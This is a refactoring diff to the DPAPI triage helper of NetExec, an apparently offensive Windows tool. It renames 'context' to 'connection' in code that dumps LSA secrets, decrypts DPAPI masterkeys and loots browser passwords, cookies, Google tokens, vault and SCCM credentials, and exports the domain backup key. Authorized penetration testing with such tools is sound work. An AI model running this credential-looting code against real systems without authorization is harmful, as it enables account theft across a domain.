@@ -13,7 +13,7 @@ from nxc.helpers.firefox import FirefoxCookie, FirefoxData, FirefoxTriage
 from nxc.helpers.logger import highlight
 
 
-def upgrade_to_dploot_connection(target, context):
+def upgrade_to_dploot_connection(target, connection):
     """
     DPLootConnection classes implements a whole lot of stuff to handle the DPAPI part.
     This function gets the calling NXC protocol and tries reuse the already opened connection
@@ -26,32 +26,32 @@ def upgrade_to_dploot_connection(target, context):
             case "smb":
                 from dploot.lib.network.smb import DPLootSMBConnection
                 conn = DPLootSMBConnection(target)
-                if context is not None:
-                    conn.smb_session = context.conn
+                if connection is not None:
+                    conn.smb_session = connection.conn
                 else:
                     conn.connect()
             case "wmi":
                 from dploot.lib.network.wmi import DPLootWMIConnection
                 conn = DPLootWMIConnection(target)
-                if context is not None:
-                    conn.dcom = context.dcom_conn
-                    conn.iWbemLevel1Login = context.iWbemLevel1Login
+                if connection is not None:
+                    conn.dcom = connection.dcom_conn
+                    conn.iWbemLevel1Login = connection.iWbemLevel1Login
                 else:
                     conn.connect()
             case "winrm":
                 from dploot.lib.network.winrm import DPLootWINRMConnection
                 conn = DPLootWINRMConnection(target)
-                if context is not None:
-                    conn.conn = context.conn
+                if connection is not None:
+                    conn.conn = connection.conn
                 else:
                     conn.connect()
             case "mssql":
                 from dploot.lib.network.mssql import DPLootMSSQLConnection
                 conn = DPLootMSSQLConnection(target)
-                if context is not None:
-                    conn.conn = context.conn
+                if connection is not None:
+                    conn.conn = connection.conn
     except Exception as e:
-        context.logger.debug(e)
+        connection.logger.debug(e)
         return None
 
     return conn
@@ -80,8 +80,8 @@ class DPAPITriage:
     This way, every DPAPI related module will automaticaly work with the protocol
 
     """
-    def __init__(self, context, target: Target):
-        self.context = context
+    def __init__(self, connection, target: Target):
+        self.connection = connection
         self.target = target
 
         self.conn = None
@@ -90,11 +90,11 @@ class DPAPITriage:
         self._pvkbytes = None
 
         # Keep track of writing secrets in file
-        self.output_file = self.context.output_file_template.format(output_folder="dpapi")
+        self.output_file = self.connection.output_file_template.format(output_folder="dpapi")
         self.secrets_counter = 0
 
-        if context.args.dpapi is not None:
-            self.dump_cookies = "cookies" in context.args.dpapi
+        if connection.args.dpapi is not None:
+            self.dump_cookies = "cookies" in connection.args.dpapi
 
         # Variables to know what materkey types have already been dumped
         self.system_masterkeys_already_dumped = False
@@ -106,11 +106,11 @@ class DPAPITriage:
     def __del__(self):
         # When everything is finished, then we give the feedback to the user
         if self.output_file is not None and self.secrets_counter > 0:
-            self.context.logger.success(f"Dumped {highlight(self.secrets_counter)} DPAPI secrets to {self.output_file}")
+            self.connection.logger.success(f"Dumped {highlight(self.secrets_counter)} DPAPI secrets to {self.output_file}")
 
     def log_secret(self, line):
         # Handle the secret counter here, avoid to handle it in multiple places
-        self.context.logger.highlight(line)
+        self.connection.logger.highlight(line)
         with open(self.output_file, "a", encoding="utf-8") as fd:
             self.secrets_counter += 1
             fd.write(line + "\n")
@@ -118,11 +118,11 @@ class DPAPITriage:
     def init_connection(self):
         """Tries to initiate a DPLootConnection object from a NXC connection"""
         if self.conn is not None:
-            self.context.logger.debug("DPLoot connection already initiated, skipping.")
+            self.connection.logger.debug("DPLoot connection already initiated, skipping.")
             return
-        self.conn = upgrade_to_dploot_connection(context=self.context, target=self.target)
+        self.conn = upgrade_to_dploot_connection(connection=self.connection, target=self.target)
         if self.conn is None:
-            self.context.logger.fail("Could not upgrade connection to allow DPAPI triage")
+            self.connection.logger.fail("Could not upgrade connection to allow DPAPI triage")
             return
 
     def collect_masterkeys_from_target(self, dump_users: True, dump_system: False):
@@ -140,37 +140,37 @@ class DPAPITriage:
         nthashes = {}
 
         # First, check and handle the mkfile arg
-        if self.context.args.mkfile is not None:
+        if self.connection.args.mkfile is not None:
             try:
-                masterkeys += parse_masterkey_file(self.context.args.mkfile)
+                masterkeys += parse_masterkey_file(self.connection.args.mkfile)
             except Exception as e:
-                self.context.logger.fail(str(e))
+                self.connection.logger.fail(str(e))
 
         # Then, use nxcdb to fill wordlists, this can help to decrypt some masterkeys
         if dump_users:
             users = self.conn.list_users()
-            plaintexts = {username: password for _, _, username, password, _, _ in self.context.db.get_credentials_for_users(usernames=users, cred_type="plaintext")}
-            nthashes = {username: nt.split(":")[1] if ":" in nt else nt for _, _, username, nt, _, _ in self.context.db.get_credentials_for_users(usernames=users, cred_type="hash")}
+            plaintexts = {username: password for _, _, username, password, _, _ in self.connection.db.get_credentials_for_users(usernames=users, cred_type="plaintext")}
+            nthashes = {username: nt.split(":")[1] if ":" in nt else nt for _, _, username, nt, _, _ in self.connection.db.get_credentials_for_users(usernames=users, cred_type="hash")}
             # dploot matches user.lower()
-            if self.context.password != "":
-                plaintexts[self.context.username.lower()] = self.context.password
-            if self.context.nthash != "":
-                nthashes[self.context.username.lower()] = self.context.nthash
+            if self.connection.password != "":
+                plaintexts[self.connection.username.lower()] = self.connection.password
+            if self.connection.nthash != "":
+                nthashes[self.connection.username.lower()] = self.connection.nthash
 
         # Now prepare the SYSTEM part
         if (dump_system
-            and self.context.dpapi_system_key is None
-            and hasattr(self.context, "lsa")
-            and callable(self.context.lsa)):
+            and self.connection.dpapi_system_key is None
+            and hasattr(self.connection, "lsa")
+            and callable(self.connection.lsa)):
             # We can use the protocol specific LSA dump if not already dumped.
             # But first, just making sure the protocol supports LSA dump :)
-            self.context.logger.display("Dumping LSA secrets to get DPAPI SYSTEM keys")
-            self.context.lsa(quiet=True)
-            if self.context.dpapi_system_key is not None:
-                self.context.logger.highlight(f"dpapi_machinekey:{self.context.dpapi_system_key['MachineKey'].hex()}")
-                self.context.logger.highlight(f"dpapi_userkey:{self.context.dpapi_system_key['UserKey'].hex()}")
+            self.connection.logger.display("Dumping LSA secrets to get DPAPI SYSTEM keys")
+            self.connection.lsa(quiet=True)
+            if self.connection.dpapi_system_key is not None:
+                self.connection.logger.highlight(f"dpapi_machinekey:{self.connection.dpapi_system_key['MachineKey'].hex()}")
+                self.connection.logger.highlight(f"dpapi_userkey:{self.connection.dpapi_system_key['UserKey'].hex()}")
             else:
-                self.context.logger.fail("Could not get DPAPI SYSTEM keys")
+                self.connection.logger.fail("Could not get DPAPI SYSTEM keys")
 
         # Invoke MasterkeyTriage class
         try:
@@ -180,29 +180,29 @@ class DPAPITriage:
                 pvkbytes=self.pvkbytes,
                 passwords=plaintexts,
                 nthashes=nthashes,
-                dpapiSystem=self.context.dpapi_system_key,
+                dpapiSystem=self.connection.dpapi_system_key,
             )
-            self.context.logger.debug(f"Masterkeys Triage: {masterkeys_triage}")
+            self.connection.logger.debug(f"Masterkeys Triage: {masterkeys_triage}")
 
             # Collect User Masterkeys if this has not already been done
             if dump_users and not self.users_masterkeys_already_dumped:
-                self.context.logger.display("Collecting DPAPI Users masterkeys")
+                self.connection.logger.display("Collecting DPAPI Users masterkeys")
                 masterkeys += masterkeys_triage.triage_masterkeys()
                 # if multiple functionalities are calling masterkeys triage, make sur we do it only once
                 self.users_masterkeys_already_dumped = True
 
             # Collect SYSTEM Masterkeys if this has not already been done
-            if self.context.dpapi_system_key is not None and not self.system_masterkeys_already_dumped:
-                self.context.logger.display("Collecting DPAPI SYSTEM masterkeys")
+            if self.connection.dpapi_system_key is not None and not self.system_masterkeys_already_dumped:
+                self.connection.logger.display("Collecting DPAPI SYSTEM masterkeys")
                 masterkeys += masterkeys_triage.triage_system_masterkeys()
                 # if multiple functionalities are calling masterkeys triage, make sur we do it only once
                 self.system_masterkeys_already_dumped = True
         except Exception as e:
-            self.context.logger.debug(f"Could not get masterkeys: {e}")
+            self.connection.logger.debug(f"Could not get masterkeys: {e}")
         self.masterkeys += masterkeys
         # If we decrypted new masterkeys, print the message
         if len(masterkeys) > 0:
-            self.context.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. ")
+            self.connection.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. ")
         return self.masterkeys
 
     def triage_credentials(self, masterkeys: list[Masterkey]):
@@ -212,7 +212,7 @@ class DPAPITriage:
             tag = "CREDENTIAL"
             line = f"[{credential.winuser}][{tag}] {credential.target} - {credential.username}:{credential.password}"
             self.log_secret(line)
-            self.context.db.add_dpapi_secrets(
+            self.connection.db.add_dpapi_secrets(
                 self.target.address,
                 tag,
                 credential.winuser,
@@ -223,11 +223,11 @@ class DPAPITriage:
 
         try:
             credentials_triage = CredentialsTriage(target=self.target, conn=self.conn, masterkeys=masterkeys, per_credential_callback=credential_callback)
-            self.context.logger.debug(f"Credentials Triage Object: {credentials_triage}")
+            self.connection.logger.debug(f"Credentials Triage Object: {credentials_triage}")
             credentials_triage.triage_credentials()
             credentials_triage.triage_system_credentials()
         except Exception as e:
-            self.context.logger.debug(f"Error while looting credentials: {e}")
+            self.connection.logger.debug(f"Error while looting credentials: {e}")
 
     def triage_chromium(self, masterkeys: list[Masterkey]):
         cng_chromekey = None
@@ -236,10 +236,10 @@ class DPAPITriage:
             cng_triage = CngTriage(target=self.target, conn=self.conn, masterkeys=masterkeys)
             for cng_file in cng_triage.triage_system_cng():
                 if cng_file.cng_blob["Name"].decode("utf-16le").rstrip("\0") == "Google Chromekey1":
-                    self.context.logger.debug("Found CNG Google ChromeKey1\n")
+                    self.connection.logger.debug("Found CNG Google ChromeKey1\n")
                     cng_chromekey = cng_file.decrypted_private_key
         except Exception as e:
-            self.context.logger.debug(f"Error while getting CNG ChromeKey1: {e}")
+            self.connection.logger.debug(f"Error while getting CNG ChromeKey1: {e}")
 
         # Collect Chrome Based Browser stored secrets
         def browser_callback(secret):
@@ -247,7 +247,7 @@ class DPAPITriage:
                 secret_url = secret.url + " -" if secret.url != "" else "-"
                 line = f"[{secret.winuser}][{secret.browser.upper()}] {secret_url} {secret.username}:{secret.password}"
                 self.log_secret(line)
-                self.context.db.add_dpapi_secrets(
+                self.connection.db.add_dpapi_secrets(
                     self.target.address,
                     secret.browser.upper(),
                     secret.winuser,
@@ -258,7 +258,7 @@ class DPAPITriage:
             elif isinstance(secret, GoogleRefreshToken):
                 line = f"[{secret.winuser}][{secret.browser.upper()}] Google Refresh Token: {secret.service}:{secret.token}"
                 self.log_secret(line)
-                self.context.db.add_dpapi_secrets(
+                self.connection.db.add_dpapi_secrets(
                     self.target.address,
                     secret.browser.upper(),
                     secret.winuser,
@@ -274,7 +274,7 @@ class DPAPITriage:
             browser_triage = BrowserTriage(target=self.target, conn=self.conn, masterkeys=masterkeys, per_secret_callback=browser_callback)
             browser_triage.triage_browsers(gather_cookies=self.dump_cookies, cng_chromekey=cng_chromekey)
         except Exception as e:
-            self.context.logger.debug(f"Error while looting browsers: {e}")
+            self.connection.logger.debug(f"Error while looting browsers: {e}")
 
     def triage_vaults(self, masterkeys: list[Masterkey]):
         def vault_callback(secret):
@@ -283,7 +283,7 @@ class DPAPITriage:
                 resource = secret.resource + " -" if secret.resource != "" else "-"
                 line = f"[{secret.winuser}][{tag}] {resource} - {secret.username}:{secret.password}"
                 self.log_secret(line)
-                self.context.db.add_dpapi_secrets(
+                self.connection.db.add_dpapi_secrets(
                     self.target.address,
                     tag,
                     secret.winuser,
@@ -297,7 +297,7 @@ class DPAPITriage:
             vaults_triage = VaultsTriage(target=self.target, conn=self.conn, masterkeys=masterkeys, per_vault_callback=vault_callback)
             vaults_triage.triage_vaults()
         except Exception as e:
-            self.context.logger.debug(f"Error while looting vaults: {e}")
+            self.connection.logger.debug(f"Error while looting vaults: {e}")
 
     def triage_firefox(self):
         def firefox_callback(secret):
@@ -306,7 +306,7 @@ class DPAPITriage:
                 url = secret.url + " -" if secret.url != "" else "-"
                 line = f"[{secret.winuser}][{tag}] {url} {secret.username}:{secret.password}"
                 self.log_secret(line)
-                self.context.db.add_dpapi_secrets(
+                self.connection.db.add_dpapi_secrets(
                     self.target.address,
                     tag,
                     secret.winuser,
@@ -320,7 +320,7 @@ class DPAPITriage:
 
         try:
             # Collect Firefox stored secrets
-            firefox_triage = FirefoxTriage(target=self.target, logger=self.context.logger, conn=self.conn, per_secret_callback=firefox_callback)
+            firefox_triage = FirefoxTriage(target=self.target, logger=self.connection.logger, conn=self.conn, per_secret_callback=firefox_callback)
             firefox_triage.run(gather_cookies=self.dump_cookies)
         except Exception as e:
             self.logger.debug(f"Error while looting firefox: {e}")
@@ -328,13 +328,13 @@ class DPAPITriage:
     # The dpapi function for every protocol
     def triage_dpapi(self):
         # Load masterkeys
-        masterkeys = self.collect_masterkeys_from_target(dump_users=True, dump_system="nosystem" not in self.context.args.dpapi)
+        masterkeys = self.collect_masterkeys_from_target(dump_users=True, dump_system="nosystem" not in self.connection.args.dpapi)
         if len(masterkeys) == 0:
             # Nothing will be recovered if no masterkeys, so we can stop there
-            self.context.logger.fail("No masterkeys looted")
+            self.connection.logger.fail("No masterkeys looted")
             return
 
-        self.context.logger.success("Looting secrets...")
+        self.connection.logger.success("Looting secrets...")
 
         # Calling all the triage functions. We can add other triage functions here
         self.triage_credentials(masterkeys)
@@ -345,17 +345,17 @@ class DPAPITriage:
     def triage_sccm(self):
         masterkeys = self.collect_masterkeys_from_target(dump_users=False, dump_system=True)
         if len(masterkeys) == 0:
-            self.context.logger.fail("No masterkeys looted")
+            self.connection.logger.fail("No masterkeys looted")
             return
 
-        self.context.logger.success("Looting SCCM Credentials")
+        self.connection.logger.success("Looting SCCM Credentials")
 
         def sccm_callback(secret):
             if isinstance(secret, SCCMCred):
                 tag = "NAA Account"
                 line = f"[{tag}] {secret.username.decode('latin-1')}:{secret.password.decode('latin-1')}"
                 self.log_secret(line)
-                self.context.db.add_dpapi_secrets(
+                self.connection.db.add_dpapi_secrets(
                     self.target.address,
                     f"SCCM - {tag}",
                     "SYSTEM",
@@ -367,7 +367,7 @@ class DPAPITriage:
                 tag = "Task sequences secret"
                 line = f"[{tag}] {secret.secret.decode('latin-1')}"
                 self.log_secret(line)
-                self.context.db.add_dpapi_secrets(
+                self.connection.db.add_dpapi_secrets(
                     self.target.address,
                     f"SCCM - {tag}",
                     "SYSTEM",
@@ -379,7 +379,7 @@ class DPAPITriage:
                 tag = "Collection Variable"
                 line = f"[{tag}] {secret.variable.decode('latin-1')}:{secret.value.decode('latin-1')}"
                 self.log_secret(line)
-                self.context.db.add_dpapi_secrets(
+                self.connection.db.add_dpapi_secrets(
                     self.target.address,
                     f"SCCM - {tag}",
                     "SYSTEM",
@@ -409,51 +409,51 @@ class DPAPITriage:
         pvkbytes = None
 
         # First check the pvk argument and handle it
-        if self.context.args.pvk is not None:
+        if self.connection.args.pvk is not None:
             try:
-                with open(self.context.args.pvk, "rb") as fd:
+                with open(self.connection.args.pvk, "rb") as fd:
                     pvkbytes = fd.read()
-                self.context.logger.success(f"Loading domain backupkey from {self.context.args.pvk}")
+                self.connection.logger.success(f"Loading domain backupkey from {self.connection.args.pvk}")
             except Exception as e:
-                self.context.logger.fail(str(e))
+                self.connection.logger.fail(str(e))
 
         # If no pvkbytes yet, then we check in the DB
         if pvkbytes is None:
             try:
-                results = self.context.db.get_domain_backupkey(self.context.domain)
+                results = self.connection.db.get_domain_backupkey(self.connection.domain)
             except Exception:
-                self.context.logger.fail("Your version of nxcdb is not up to date, run nxcdb and create a new workspace: 'workspace create dpapi' then re-run the dpapi option")
+                self.connection.logger.fail("Your version of nxcdb is not up to date, run nxcdb and create a new workspace: 'workspace create dpapi' then re-run the dpapi option")
                 return False
             if len(results) > 0:
-                self.context.logger.success("Loading domain backupkey from nxcdb...")
+                self.connection.logger.success("Loading domain backupkey from nxcdb...")
                 pvkbytes = results[0][2]
 
         # If no pvkbytes yet, then we can try to get it from a domain controller
-        if pvkbytes is None and self.context.no_da is None and self.context.args.local_auth is False:
+        if pvkbytes is None and self.connection.no_da is None and self.connection.args.local_auth is False:
             try:
                 dc_target = SMBTarget.create(
-                    domain=self.context.domain,
-                    username=self.context.username,
-                    password=self.context.password,
-                    address=self.context.kdcHost,  # querying DNS server for domain will return DC
-                    lmhash=self.context.lmhash,
-                    nthash=self.context.nthash,
-                    do_kerberos=self.context.kerberos,
-                    aesKey=self.context.aesKey,
-                    use_kcache=self.context.use_kcache,
+                    domain=self.connection.domain,
+                    username=self.connection.username,
+                    password=self.connection.password,
+                    address=self.connection.kdcHost,  # querying DNS server for domain will return DC
+                    lmhash=self.connection.lmhash,
+                    nthash=self.connection.nthash,
+                    do_kerberos=self.connection.kerberos,
+                    aesKey=self.connection.aesKey,
+                    use_kcache=self.connection.use_kcache,
                 )
                 dc_conn = DPLootSMBConnection(dc_target)
                 dc_conn.connect()  # Connect to DC
                 if dc_conn.is_admin():
-                    self.context.logger.success("User is Domain Administrator, exporting domain backupkey...")
+                    self.connection.logger.success("User is Domain Administrator, exporting domain backupkey...")
                     backupkey_triage = BackupkeyTriage(target=dc_target, conn=dc_conn)
                     backupkey = backupkey_triage.triage_backupkey()
                     pvkbytes = backupkey.backupkey_v2
-                    self.context.db.add_domain_backupkey(self.context.domain, pvkbytes)
+                    self.connection.db.add_domain_backupkey(self.connection.domain, pvkbytes)
                 else:
-                    self.context.no_da = False
+                    self.connection.no_da = False
             except Exception as e:
-                self.context.logger.fail(f"Could not get domain backupkey: {e}")
+                self.connection.logger.fail(f"Could not get domain backupkey: {e}")
 
         self._pvkbytes = pvkbytes
         return self._pvkbytes
